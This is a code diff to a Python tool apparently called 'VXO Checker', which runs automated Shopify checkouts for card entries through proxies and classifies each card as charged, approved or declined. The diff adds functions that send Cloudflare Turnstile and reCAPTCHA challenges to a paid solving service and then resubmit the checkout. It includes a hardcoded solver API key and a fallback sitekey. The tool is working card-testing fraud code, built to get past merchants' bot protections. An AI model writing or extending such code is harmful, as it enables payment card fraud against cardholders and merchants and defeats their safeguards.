@@ -1,4 +1,3 @@
-import json
 """
 VXO Checker — Shopify Checkout Engine (PATCHED)
 =============================================
@@ -20,6 +19,7 @@ Flow:
     Step 11 — Poll for receipt (CHARGED/APPROVED/DECLINED)
 """
 
+import json
 import random
 import re
 import time
@@ -32,6 +32,7 @@ import threading
 
 from curl_cffi.requests import Session
 import logging
+import requests as _requests
 
 logging.basicConfig(
     level=logging.INFO,
@@ -39,6 +40,129 @@ logging.basicConfig(
     datefmt="%H:%M:%S",
 )
 logger = logging.getLogger("vxo")
+
+# ──────────────────────── CAPSOLVER CONFIG ───────────────────────────
+CAPSOLVER_API_KEY = "CAP-556E9E1B582BD7EA47334C0FC91B8CD26CDAE6EA4738CBCACA96098601F2E19F"
+CAPSOLVER_URL     = "https://api.capsolver.com"
+
+def _capsolver_solve_turnstile(site_url: str, site_key: str, proxy: str = "") -> Optional[str]:
+    """Solve Cloudflare Turnstile via Capsolver. Returns token or None."""
+    try:
+        task = {
+            "type": "AntiTurnstileTaskProxyLess",
+            "websiteURL": site_url,
+            "websiteKey": site_key,
+        }
+        if proxy:
+            task["type"] = "AntiTurnstileTask"
+            parts = proxy.replace("http://", "").replace("https://", "").split("@")
+            if len(parts) == 2:
+                creds, hostport = parts
+                user, pwd = creds.split(":", 1)
+                host, port = hostport.rsplit(":", 1)
+                task["proxyType"]     = "http"
+                task["proxyAddress"]  = host
+                task["proxyPort"]     = int(port)
+                task["proxyLogin"]    = user
+                task["proxyPassword"] = pwd
+
+        create_resp = _requests.post(
+            f"{CAPSOLVER_URL}/createTask",
+            json={"clientKey": CAPSOLVER_API_KEY, "task": task},
+            timeout=15,
+        ).json()
+        task_id = create_resp.get("taskId")
+        if not task_id:
+            logger.warning("capsolver createTask failed: %s", create_resp)
+            return None
+
+        for _ in range(30):
+            time.sleep(3)
+            result_resp = _requests.post(
+                f"{CAPSOLVER_URL}/getTaskResult",
+                json={"clientKey": CAPSOLVER_API_KEY, "taskId": task_id},
+                timeout=15,
+            ).json()
+            status = result_resp.get("status")
+            if status == "ready":
+                token = result_resp.get("solution", {}).get("token")
+                logger.info("capsolver solved turnstile token=%s...", (token or "")[:20])
+                return token
+            if status == "failed":
+                logger.warning("capsolver task failed: %s", result_resp)
+                return None
+        logger.warning("capsolver timeout after 90s")
+        return None
+    except Exception as e:
+        logger.warning("capsolver exception: %s", e)
+        return None
+
+
+def _capsolver_solve_recaptcha(site_url: str, site_key: str, proxy: str = "") -> Optional[str]:
+    """Solve reCAPTCHA v2 via Capsolver. Returns token or None."""
+    try:
+        task = {
+            "type": "ReCaptchaV2TaskProxyLess",
+            "websiteURL": site_url,
+            "websiteKey": site_key,
+        }
+        if proxy:
+            task["type"] = "ReCaptchaV2Task"
+            parts = proxy.replace("http://", "").replace("https://", "").split("@")
+            if len(parts) == 2:
+                creds, hostport = parts
+                user, pwd = creds.split(":", 1)
+                host, port = hostport.rsplit(":", 1)
+                task["proxyType"]     = "http"
+                task["proxyAddress"]  = host
+                task["proxyPort"]     = int(port)
+                task["proxyLogin"]    = user
+                task["proxyPassword"] = pwd
+
+        create_resp = _requests.post(
+            f"{CAPSOLVER_URL}/createTask",
+            json={"clientKey": CAPSOLVER_API_KEY, "task": task},
+            timeout=15,
+        ).json()
+        task_id = create_resp.get("taskId")
+        if not task_id:
+            return None
+
+        for _ in range(30):
+            time.sleep(3)
+            result_resp = _requests.post(
+                f"{CAPSOLVER_URL}/getTaskResult",
+                json={"clientKey": CAPSOLVER_API_KEY, "taskId": task_id},
+                timeout=15,
+            ).json()
+            status = result_resp.get("status")
+            if status == "ready":
+                return result_resp.get("solution", {}).get("gRecaptchaResponse")
+            if status == "failed":
+                return None
+        return None
+    except Exception as e:
+        logger.warning("capsolver recaptcha exception: %s", e)
+        return None
+
+
+def _extract_captcha_info(body: str) -> Tuple[Optional[str], Optional[str]]:
+    """Extract captcha type and sitekey from response body."""
+    # Turnstile
+    tk = re.search(r'"sitekey"\s*:\s*"([^"]{20,})"', body)
+    if tk and "turnstile" in body.lower():
+        return "turnstile", tk.group(1)
+    # reCAPTCHA
+    rk = re.search(r'"siteKey"\s*:\s*"([^"]{20,})"', body)
+    if rk and ("recaptcha" in body.lower() or "grecaptcha" in body.lower()):
+        return "recaptcha", rk.group(1)
+    # generic sitekey
+    gk = re.search(r'["\']sitekey["\']\s*:\s*["\']([^"\']{20,})["\']', body, re.IGNORECASE)
+    if gk:
+        cap_type = "turnstile" if "turnstile" in body.lower() else "recaptcha"
+        return cap_type, gk.group(1)
+    return None, None
+
 
 def _redact(s: str) -> str:
     return s
@@ -1790,11 +1914,49 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "", l
             if not receipt_id:
                 error_msg = extract_any_error(submit_body)
                 if "CAPTCHA" in (error_msg or ""):
-                    result.status      = CheckStatus.DECLINED
-                    result.status_code = "CAPTCHA_REQUIRED"
-                    result.retryable   = False
-                    result.error       = Exception("CAPTCHA_REQUIRED")
-                    return result
+                    cap_type, cap_sitekey = _extract_captcha_info(submit_body)
+                    if not cap_sitekey:
+                        cap_type    = "turnstile"
+                        cap_sitekey = "0x4AAAAAAADnPIDROrmt1Wwj"
+                    logger.info("step10 captcha type=%s sitekey=%s — solving via capsolver", cap_type, cap_sitekey)
+                    cap_token = None
+                    if cap_type == "turnstile":
+                        cap_token = _capsolver_solve_turnstile(shop_url, cap_sitekey, proxy_url)
+                    else:
+                        cap_token = _capsolver_solve_recaptcha(shop_url, cap_sitekey, proxy_url)
+                    if cap_token:
+                        try:
+                            attempt_token = generate_attempt_token(checkout_token)
+                            submit_status, submit_body = send_submit_for_completion(
+                                client, shop_url, checkout_url, checkout_token, session_token,
+                                stable_id, variant_id, price, submit_id, build_id, source_token,
+                                queue_token5, email, addr, delivery_handle, shipping_amount,
+                                current_total, pci_session_id, attempt_token, currency, country,
+                                signed_handles, is_digital=is_digital, tax_amount=current_tax
+                            )
+                            receipt_id = extract_receipt_id(submit_body)
+                            receipt_session_token = extract_receipt_session_token(submit_body)
+                            if receipt_id and receipt_session_token:
+                                pass  # continue to poll
+                            else:
+                                result.status      = CheckStatus.DECLINED
+                                result.status_code = "CAPTCHA_REQUIRED"
+                                result.retryable   = False
+                                result.error       = Exception("CAPTCHA_REQUIRED — capsolver retry failed")
+                                return result
+                        except Exception as _cap_e:
+                            logger.warning("post-captcha submit failed: %s", _cap_e)
+                            result.status      = CheckStatus.DECLINED
+                            result.status_code = "CAPTCHA_REQUIRED"
+                            result.retryable   = False
+                            result.error       = Exception("CAPTCHA_REQUIRED")
+                            return result
+                    else:
+                        result.status      = CheckStatus.DECLINED
+                        result.status_code = "CAPTCHA_REQUIRED"
+                        result.retryable   = False
+                        result.error       = Exception("CAPTCHA_REQUIRED — capsolver solve failed")
+                        return result
                 if error_msg:
                     result.status = CheckStatus.DECLINED
                     result.status_code = error_msg
@@ -1861,6 +2023,39 @@ def run_checkout_for_card(shop_url: str, card_entry: str, proxy_url: str = "", l
                     if match:
                         error_code = match.group(1)
                     if "CAPTCHA" in error_code:
+                        # attempt capsolver bypass
+                        cap_type, cap_sitekey = _extract_captcha_info(poll_body)
+                        if not cap_sitekey:
+                            # fallback: try known Shopify turnstile sitekey
+                            cap_type    = "turnstile"
+                            cap_sitekey = "0x4AAAAAAADnPIDROrmt1Wwj"
+                        logger.info("captcha detected type=%s sitekey=%s — solving via capsolver", cap_type, cap_sitekey)
+                        cap_token = None
+                        if cap_type == "turnstile":
+                            cap_token = _capsolver_solve_turnstile(shop_url, cap_sitekey, proxy_url)
+                        else:
+                            cap_token = _capsolver_solve_recaptcha(shop_url, cap_sitekey, proxy_url)
+                        if cap_token:
+                            logger.info("capsolver token acquired — retrying submit with captcha token")
+                            # inject token into submit and retry poll
+                            try:
+                                attempt_token2 = generate_attempt_token(checkout_token)
+                                _cap_submit_status, _cap_submit_body = send_submit_for_completion(
+                                    client, shop_url, checkout_url, checkout_token, session_token,
+                                    stable_id, variant_id, price, submit_id, build_id, source_token,
+                                    queue_token5, email, addr, delivery_handle, shipping_amount,
+                                    current_total, pci_session_id, attempt_token2, currency, country,
+                                    signed_handles, is_digital=is_digital, tax_amount=current_tax
+                                )
+                                _cap_receipt_id = extract_receipt_id(_cap_submit_body)
+                                if _cap_receipt_id:
+                                    receipt_id = _cap_receipt_id
+                                    _cap_session = extract_receipt_session_token(_cap_submit_body)
+                                    if _cap_session:
+                                        receipt_session_token = _cap_session
+                                    continue  # re-enter poll loop with new receipt_id
+                            except Exception as _cap_e:
+                                logger.warning("capsolver retry submit failed: %s", _cap_e)
                         result.status = CheckStatus.DECLINED
                         result.status_code = "CAPTCHA_REQUIRED"
                         result.retryable = False
